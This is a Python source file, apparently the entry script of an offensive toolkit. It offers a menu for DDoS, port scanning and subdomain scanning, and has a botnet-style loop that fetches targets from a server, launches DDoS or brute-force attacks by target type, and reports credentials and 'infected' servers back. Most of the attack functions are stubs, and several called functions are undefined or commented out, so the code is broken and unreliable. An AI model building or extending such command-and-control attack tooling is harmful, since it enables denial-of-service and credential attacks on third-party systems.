import requests
import socket
import time
import threading
import socket
from tqdm import tqdm
from ddos import perform_ddos_attack_wrapper


from menu import display_menu

from port_scan import port_scan

from subdomain import scan_subdomains

#from api import get_target, add_target, submi

#from brut import brute

BASE_URL = "base.url"



def perform_ddos_attack(target_ip, target_port=80, additional_info={}):
    # Implement your DDoS attack logic here
    print(f"Performing DDoS attack on {target_ip}")

    ssl = additional_info.get("ssl", False)

    method = additional_info.get("method", None)

    ddos(target_ip, target_port, ssl, method)


def perform_bruteforce_attack(ip, username, password_list):
    # Implement your bruteforce attack logic here
    print(
        f"Performing bruteforce attack on {ip} with username {username} and password list {password_list}"
    )
    brute(ip)


def perform_aggressive_bruteforce_attack(ip):
    # Implement your aggressive bruteforce attack logic here
    print(f"Performing aggressive bruteforce attack on {ip}")


def valikko():
    while True:
        display_menu()
        select = input("Select function (q to quit): ")

        if select == '0':
            perform_ddos_attack_wrapper()
        elif select == '1':
            port_scan()
        elif select == '2':
            print("Bruteforce function not implemented")
        elif select == '3':
            scan_subdomains()
        elif select.lower() == 'q':
            print("Exiting program.")
            break
        else:
            print("Invalid option. Please choose a valid option.")

valikko()

# Example usage
while True:
    # Retrieve a target from the server
    target_response = get_target()
    if target_response.get("ip"):
        target_ip = target_response["ip"]
        target_type = target_response["type"]
        target_port = target_response["port"]
        target_priority = target_response["priority"]
        additional_info = target_response["additional_info"]

        print(
            f"Received target: IP - {target_ip}, Type - {target_type}, Port - {target_port}, Priority - {target_priority}"
        )

        # Simulate adding the target to the attack list
        add_target(target_ip, target_type, target_port, target_priority)

        # Determine the attack type and call the corresponding function
        if target_type == 0:
            available_ports = perform_port_scan(target_ip, 1, 1024)
            print(f"Available ports: {available_ports}")
        elif target_type == 1:
            perform_ddos_attack(target_ip, target_port, additional_info)
        elif target_type == 2:
            perform_bruteforce_attack(target_ip, "admin", ["password123", "admin123"])
        elif target_type == 3:
            perform_aggressive_bruteforce_attack(target_ip)

        # Simulate finding credentials and notifying the server
        notify_credentials_found(target_ip, "admin", "password123")

        # Simulate notifying the server about an infected server
        notify_infected_server(target_ip)

    # Sleep for a while before the next iteration
    time.sleep(60)  # Sleep for 60 seconds before the next iteration


